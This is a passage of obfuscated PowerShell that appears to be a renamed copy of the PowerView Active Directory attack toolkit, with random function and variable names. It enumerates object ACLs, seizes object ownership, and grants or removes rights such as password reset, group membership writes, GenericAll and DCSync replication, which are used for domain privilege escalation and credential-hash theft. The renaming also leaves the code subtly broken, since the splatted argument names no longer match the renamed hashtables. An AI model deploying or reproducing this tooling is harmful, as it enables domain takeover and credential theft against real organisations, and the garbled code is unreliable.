            if ($PSBoundParameters['ServerTimeLimit']) { $hBSkMWAr99['ServerTimeLimit'] = $mvTbAWDU99 }
            if ($PSBoundParameters['Tombstone']) { $hBSkMWAr99['Tombstone'] = $rPozaKft99 }
            if ($PSBoundParameters['Credential']) { $hBSkMWAr99['Credential'] = $gxazvivN99 }
            $KLoeydcd99 = farrowing @PrincipalSearcherArguments
            if (-not $KLoeydcd99) {
                throw "Unable to resolve principal: $yhJclZId99"
            }
            elseif($KLoeydcd99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $vEAcbmpj99 = $KLoeydcd99.objectsid
        }
        else {
            $vEAcbmpj99 = $yhJclZId99
        }
        $CErpbdPZ99 = 0
        foreach($r in $Right) {
            $CErpbdPZ99 = $CErpbdPZ99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $CErpbdPZ99 = [System.DirectoryServices.ActiveDirectoryRights]$CErpbdPZ99
        $BfpbWwpi99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$vEAcbmpj99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($XmSculID99 -eq $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99
            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99)
            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99), $pHXTVyEm99
            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, $XmSculID99
            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, $XmSculID99, $ARVPipoY99
            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, $XmSculID99, $ARVPipoY99, $pHXTVyEm99
            }
        }
        else {
            if($XmSculID99 -eq $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99
            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99)
            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99), $pHXTVyEm99
            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, $XmSculID99
            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, $XmSculID99, $ARVPipoY99
            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, $XmSculID99, $ARVPipoY99, $pHXTVyEm99
            }
        }
    }
}
function Lafitte {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $BfpbWwpi99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $FXydyfnV99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $PqVjzRLd99 = farrowing @SearcherArguments -Identity $FXydyfnV99 -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($PqVjzRLd99) {
            $IJRNbRsV99 = [System.Security.Principal.SecurityIdentifier]$PqVjzRLd99
        }
        else {
            Write-Warning "[Lafitte] Error parsing owner identity '$FXydyfnV99'"
        }
    }
    PROCESS {
        if ($IJRNbRsV99) {
            $PPosolen99['Raw'] = $True
            $PPosolen99['Identity'] = $BfpbWwpi99
            $FHZdVnWh99 = farrowing @SearcherArguments
            ForEach ($Object in $FHZdVnWh99) {
                try {
                    Write-Verbose "[Lafitte] Attempting to set the owner for '$BfpbWwpi99' to '$FXydyfnV99'"
                    $Entry = $FHZdVnWh99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($IJRNbRsV99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Lafitte] Error setting owner: $_"
                }
            }
        }
    }
}
function pols {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $BfpbWwpi99,
        [Switch]
        $Sacl,
        [Switch]
        $wZrotwTh99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $weQLqZWd99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $PPosolen99['SecurityMasks'] = 'Sacl'
        }
        else {
            $PPosolen99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $TbkLYEaJ99 = watersides @SearcherArguments
        $wzHlWvRf99 = @{}
        if ($PSBoundParameters['Domain']) { $wzHlWvRf99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $wzHlWvRf99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['ResultPageSize']) { $wzHlWvRf99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wzHlWvRf99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Credential']) { $wzHlWvRf99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = fault @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($TbkLYEaJ99) {
            $afFJXkRc99 = ''
            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^S-1-.*') {
                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
                }
                elseif ($QghnbJOP99 -match '^(CN|OU|DC)=.*') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[pols] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $TbkLYEaJ99 = watersides @SearcherArguments
                        if (-not $TbkLYEaJ99) {
                            Write-Warning "[pols] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                }
                elseif ($QghnbJOP99.Contains('.')) {
                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(dnshostname=$QghnbJOP99))"
                }
                else {
                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(displayname=$QghnbJOP99))"
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[pols] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            if ($kXbEpVCq99) {
                $TbkLYEaJ99.filter = "(&$kXbEpVCq99)"
            }
            Write-Verbose "[pols] pols filter string: $($TbkLYEaJ99.filter)"
            $pfqXXMQd99 = $TbkLYEaJ99.FindAll()
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $vEAcbmpj99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $vEAcbmpj99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $eJMVdcvK99 = Switch ($weQLqZWd99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $eJMVdcvK99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $vEAcbmpj99
                                $QNmOTPuW99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $vEAcbmpj99
                            $QNmOTPuW99 = $True
                        }
                        if ($QNmOTPuW99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $LYKVxRFW99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $LYKVxRFW99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $LYKVxRFW99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $LYKVxRFW99[$_.Name] = $_.Value
                                    }
                                }
                                $epqYIHWM99 = New-Object -TypeName PSObject -Property $LYKVxRFW99
                                $epqYIHWM99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $epqYIHWM99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[pols] Error: $_"
                }
            }
        }
    }
}
function requirements {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $ImYRLJwd99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IayDthuO99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $uvdgMODF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CpraPbHA99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $yhJclZId99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fcfzDfVI99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $uDyzYPFx99 = 'All',
        [Guid]
        $ttBmZLHk99
    )
    BEGIN {
        $MLmKnjod99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $MLmKnjod99['Domain'] = $IayDthuO99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $MLmKnjod99['LDAPFilter'] = $uvdgMODF99 }
        if ($PSBoundParameters['TargetSearchBase']) { $MLmKnjod99['SearchBase'] = $CpraPbHA99 }
        if ($PSBoundParameters['Server']) { $MLmKnjod99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $MLmKnjod99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $MLmKnjod99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $MLmKnjod99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $MLmKnjod99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $MLmKnjod99['Credential'] = $gxazvivN99 }
        $hBSkMWAr99 = @{
            'Identity' = $yhJclZId99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $hBSkMWAr99['Domain'] = $fcfzDfVI99 }
        if ($PSBoundParameters['Server']) { $hBSkMWAr99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $hBSkMWAr99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $hBSkMWAr99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $hBSkMWAr99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $hBSkMWAr99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $hBSkMWAr99['Credential'] = $gxazvivN99 }
        $sOpNNZru99 = farrowing @PrincipalSearcherArguments
        if (-not $sOpNNZru99) {
            throw "Unable to resolve principal: $yhJclZId99"
        }
    }
    PROCESS {
        $MLmKnjod99['Identity'] = $ImYRLJwd99
        $khNNPamj99 = farrowing @TargetSearcherArguments
        ForEach ($UAGfwAnC99 in $khNNPamj99) {
            $ARVPipoY99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $CWTmfuAd99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($ttBmZLHk99) {
                $GUIDs = @($ttBmZLHk99)
            }
            else {
                $GUIDs = Switch ($uDyzYPFx99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($VSoDkQsP99 in $sOpNNZru99) {
                Write-Verbose "[requirements] Granting principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' on $($UAGfwAnC99.Properties.distinguishedname)"
                try {
                    $BfpbWwpi99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$VSoDkQsP99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NQyWORBy99 = New-Object Guid $GUID
                            $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $NQyWORBy99, $ARVPipoY99
                        }
                    }
                    else {
                        $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $ARVPipoY99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[requirements] Granting principal $($VSoDkQsP99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($UAGfwAnC99.Properties.distinguishedname)"
                        $jLkGSgjF99 = $UAGfwAnC99.GetDirectoryEntry()
                        $jLkGSgjF99.PsBase.Options.SecurityMasks = 'Dacl'
                        $jLkGSgjF99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $jLkGSgjF99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[requirements] Error granting principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' on $($UAGfwAnC99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function cheapens {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $ImYRLJwd99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IayDthuO99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $uvdgMODF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CpraPbHA99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $yhJclZId99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fcfzDfVI99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $uDyzYPFx99 = 'All',
        [Guid]
        $ttBmZLHk99
    )
    BEGIN {
        $MLmKnjod99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $MLmKnjod99['Domain'] = $IayDthuO99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $MLmKnjod99['LDAPFilter'] = $uvdgMODF99 }
        if ($PSBoundParameters['TargetSearchBase']) { $MLmKnjod99['SearchBase'] = $CpraPbHA99 }
        if ($PSBoundParameters['Server']) { $MLmKnjod99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $MLmKnjod99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $MLmKnjod99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $MLmKnjod99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $MLmKnjod99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $MLmKnjod99['Credential'] = $gxazvivN99 }
        $hBSkMWAr99 = @{
            'Identity' = $yhJclZId99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $hBSkMWAr99['Domain'] = $fcfzDfVI99 }
        if ($PSBoundParameters['Server']) { $hBSkMWAr99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $hBSkMWAr99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $hBSkMWAr99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $hBSkMWAr99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $hBSkMWAr99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $hBSkMWAr99['Credential'] = $gxazvivN99 }
        $sOpNNZru99 = farrowing @PrincipalSearcherArguments
        if (-not $sOpNNZru99) {
            throw "Unable to resolve principal: $yhJclZId99"
        }
    }
    PROCESS {
        $MLmKnjod99['Identity'] = $ImYRLJwd99
        $khNNPamj99 = farrowing @TargetSearcherArguments
        ForEach ($UAGfwAnC99 in $khNNPamj99) {
            $ARVPipoY99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $CWTmfuAd99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($ttBmZLHk99) {
                $GUIDs = @($ttBmZLHk99)
            }
            else {
                $GUIDs = Switch ($uDyzYPFx99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($VSoDkQsP99 in $sOpNNZru99) {
                Write-Verbose "[cheapens] Removing principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' from $($UAGfwAnC99.Properties.distinguishedname)"
                try {
                    $BfpbWwpi99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$VSoDkQsP99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NQyWORBy99 = New-Object Guid $GUID
                            $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $NQyWORBy99, $ARVPipoY99
                        }
                    }
                    else {
                        $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $ARVPipoY99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[cheapens] Granting principal $($VSoDkQsP99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($UAGfwAnC99.Properties.distinguishedname)"
                        $jLkGSgjF99 = $UAGfwAnC99.GetDirectoryEntry()
                        $jLkGSgjF99.PsBase.Options.SecurityMasks = 'Dacl'
                        $jLkGSgjF99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $jLkGSgjF99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[cheapens] Error removing principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' from $($UAGfwAnC99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function voile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $SSNUOPgW99,
        [Switch]
        $wZrotwTh99,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $weQLqZWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $WGnEEzJx99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $WGnEEzJx99['ResolveGUIDs'] = $wZrotwTh99 }
        if ($PSBoundParameters['RightsFilter']) { $WGnEEzJx99['RightsFilter'] = $weQLqZWd99 }
        if ($PSBoundParameters['LDAPFilter']) { $WGnEEzJx99['LDAPFilter'] = $HOOTOEqu99 }
